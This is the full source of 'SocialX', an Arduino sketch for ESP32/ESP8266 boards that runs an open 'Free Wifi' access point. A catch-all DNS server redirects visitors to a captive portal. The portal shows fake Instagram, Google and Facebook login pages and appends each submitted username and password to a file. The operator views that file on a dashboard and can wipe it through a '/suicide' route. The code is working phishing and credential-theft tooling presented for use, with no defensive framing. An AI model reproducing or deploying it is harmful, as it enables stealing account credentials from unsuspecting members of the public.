//SOCIALX VERSION 1.1.1

#if defined (ESP32)
#include "WiFi.h"
#include "SPIFFS.h"
#else
#include <ESP8266WiFi.h>
#include <FS.h>
#endif

#include "ESPAsyncWebServer.h"
#include <DNSServer.h>

String ap_ssid_str, ap_pass_str;

const byte DNS_PORT = 53;
IPAddress apIP(8,8,8,8);

DNSServer dnsServer;
AsyncWebServer server(80);

String dashboardProcessor(const String& var) {
  if (var == "AP_NAME") {
    return ap_ssid_str;
  }
  if (var == "AP_PASS") {
    return ap_pass_str;
  }
  if (var == "LIST") {
    File credentials = SPIFFS.open("/core/creds.socx", "r");
    String creds = credentials.readString();
    return creds;
  }
  return String();
}

String authHtml = "<!DOCTYPE html><html><head>  <title>Free Wifi - Authentication</title>  <meta name='viewport' content='width=device-width, initial-scale=0.75'>  <link rel='icon' href='data:,'>  <link rel='stylesheet' type='text/css' href='instagram_style.css'></head><body>  <div class='container'>      <div class='box'>          <div class='heading2'></div>          <p>Before allowing access to network we would like to verify your identity if you are not a robot. Select authentication method from the list below.</p>          <form class='login-form' action='/instagram_auth'>              <button class='login-button' title='login'>Auth Via Instagram</button>              <p></p>          </form>          <form class='login-form' action='/google_auth'>              <button class='login-button' title='login'>Auth Via Google</button>              <p></p>          </form>          <form class='login-form' action='/facebook_auth'>              <button class='login-button' title='login'>Auth Via Facebook</button>              <p></p>          </form>      </div>  </div></body></html>";
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {
    //START OF AUTH METHOD
    server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send_P(200, "text/html", authHtml.c_str());
    });
    // END OF AUTH METHOD

    //START OF INSTAGRAM
    server.on("/instagram_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/instagram.html", String(), false, dashboardProcessor);
    });
    server.on("/instagram_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/instagram_style.css", "text/css");
    });
    server.on("/instagram.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/imgs/instagram.png", "image/png");
    });
    //END OF INSTAGRAM

    //START OF GOOGLE
    server.on("/google_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/google.html", String(), false, dashboardProcessor);
    });
    server.on("/google_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/google_style.css", "text/css");
    });
    server.on("/google.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/imgs/google.png", "image/png");
    });
    //END OF GOOGLE

    //START OF FACEBOOK
    server.on("/facebook_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/facebook.html", String(), false, dashboardProcessor);
    });
    server.on("/facebook_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/facebook_style.css", "text/css");
    });
    //END OF FACEBOOK
    
    //START OF CORE
    server.on("/dashboard", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/dashboard.html", String(), false, dashboardProcessor);
    });
    server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/credentials.html", String(), false, dashboardProcessor);
    });
    server.on("/suicide", HTTP_GET, [](AsyncWebServerRequest * request) {
      SPIFFS.remove("/core/creds.socx");
      request->redirect("/credentials");
    });
    server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/style.css", "text/css");
    });  
    server.on("/verified", HTTP_GET, [](AsyncWebServerRequest * request) {
      String authMethod, user, pass;
      int paramsNr = request->params();
      for (int i = 0; i < paramsNr; i++) {
        AsyncWebParameter* p = request->getParam(i);
        if (p->name() == "authMethod") {
          authMethod = p->value();
        }
        if (p->name() == "username") {
          user = p->value();
        }
        if (p->name() == "password") {
          pass = p->value() + "<br><br>";
        }
      }
      File credentials = SPIFFS.open("/core/creds.socx", "a");
      String creds = "<strong>Auth Method:</strong> " + authMethod + " <strong>Username:</strong> " + user + " <strong>Password:</strong> " + pass;
      credentials.print(creds);
      credentials.close();
      request->send(SPIFFS, "/htmls/success.html", String(), false, dashboardProcessor);
    });
    server.on("/apply", HTTP_GET, [](AsyncWebServerRequest * request) {
      int paramsNr = request->params();
      for (int i = 0; i < paramsNr; i++) {
        AsyncWebParameter* p = request->getParam(i);
        if (p->name() == "ap_name") {
          ap_ssid_str = p->value() + "\n";
        }
        if (p->name() == "ap_pass") {
          ap_pass_str = p->value() + "\n";
        }
      }
      File settings = SPIFFS.open("/core/settings.socx", "w");
      settings.print(ap_ssid_str);
      settings.print(ap_pass_str);
      settings.close();
      request->redirect("/dashboard");
      delay(2000);
      ESP.restart();
    });
    server.on("/freewifi.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/imgs/freewifi.png", "image/png");
    });
    //END OF CORE
  }
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    //
    request->send_P(200, "text/html", authHtml.c_str());
    //request->send_P(SPIFFS, "/htmls/selectAuthMethod.html", String(), false, dashboardProcessor);  
  }
};

void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  if (SPIFFS.exists("/core/settings.socx")) {
    File settings = SPIFFS.open("/core/settings.socx", "r");
    int i = 0;
    char buffer[64];
    while (settings.available()) {
      int l = settings.readBytesUntil('\n', buffer, sizeof(buffer));
      buffer[l] = 0;
      if (i == 0) {
        ap_ssid_str = buffer;
      }
      if (i == 1) {
        ap_pass_str = buffer;
      }
      i++;
      if (i == 2) {
        break;
      }
    }
  } else {
    Serial.println("[Booting Failed] Settings file is missing!");
    ESP.deepSleep(0);
    return;
  }
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  if (!WiFi.softAP(ap_ssid_str.c_str(), ap_pass_str.c_str())) {
    String backup_ap_ssid_str, backup_ap_pass_str;
    backup_ap_ssid_str = "BackupSocialX";
    backup_ap_pass_str = "";
    WiFi.softAP(backup_ap_ssid_str.c_str(), backup_ap_pass_str.c_str());
  }
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  dnsServer.start(DNS_PORT, "*", apIP);
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  //START OF AUTH METHOD
    server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send_P(200, "text/html", authHtml.c_str());
      //request->send(SPIFFS, "/htmls/selectAuthMethod.html", String(), false, dashboardProcessor);
    });
    // END OF AUTH METHOD

    //START OF INSTAGRAM
    server.on("/instagram_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/instagram.html", String(), false, dashboardProcessor);
    });
    server.on("/instagram_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/instagram_style.css", "text/css");
    });
    server.on("/instagram.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/imgs/instagram.png", "image/png");
    });
    //END OF INSTAGRAM

    //START OF GOOGLE
    server.on("/google_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/google.html", String(), false, dashboardProcessor);
    });
    server.on("/google_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/google_style.css", "text/css");
    });
    server.on("/google.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/imgs/google.png", "image/png");
    });
    //END OF GOOGLE

    //START OF FACEBOOK
    server.on("/facebook_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/facebook.html", String(), false, dashboardProcessor);
    });
    server.on("/facebook_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/facebook_style.css", "text/css");
    });
    //END OF FACEBOOK
    
    //START OF CORE
    server.on("/dashboard", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/dashboard.html", String(), false, dashboardProcessor);
    });
    server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/htmls/credentials.html", String(), false, dashboardProcessor);
    });
    server.on("/suicide", HTTP_GET, [](AsyncWebServerRequest * request) {
      SPIFFS.remove("/core/creds.socx");
      request->redirect("/credentials");
    });
    server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/styles/style.css", "text/css");
    });  
    server.on("/verified", HTTP_GET, [](AsyncWebServerRequest * request) {
      String authMethod, user, pass;
      int paramsNr = request->params();
      for (int i = 0; i < paramsNr; i++) {
        AsyncWebParameter* p = request->getParam(i);
        if (p->name() == "authMethod") {
          authMethod = p->value();
        }
        if (p->name() == "username") {
          user = p->value();
        }
        if (p->name() == "password") {
          pass = p->value() + "<br><br>";
        }
      }
      File credentials = SPIFFS.open("/core/creds.socx", "a");
      String creds = "<strong>Auth Method:</strong> " + authMethod + " <strong>Username:</strong> " + user + " <strong>Password:</strong> " + pass;
      credentials.print(creds);
      credentials.close();
      request->send(SPIFFS, "/htmls/success.html", String(), false, dashboardProcessor);
    });
    server.on("/apply", HTTP_GET, [](AsyncWebServerRequest * request) {
      int paramsNr = request->params();
      for (int i = 0; i < paramsNr; i++) {
        AsyncWebParameter* p = request->getParam(i);
        if (p->name() == "ap_name") {
          ap_ssid_str = p->value() + "\n";
        }
        if (p->name() == "ap_pass") {
          ap_pass_str = p->value() + "\n";
        }
      }
      File settings = SPIFFS.open("/core/settings.socx", "w");
      settings.print(ap_ssid_str);
      settings.print(ap_pass_str);
      settings.close();
      request->redirect("/dashboard");
      delay(2000);
      ESP.restart();
    });
    server.on("/freewifi.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/imgs/freewifi.png", "image/png");
    });
    //END OF CORE
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}
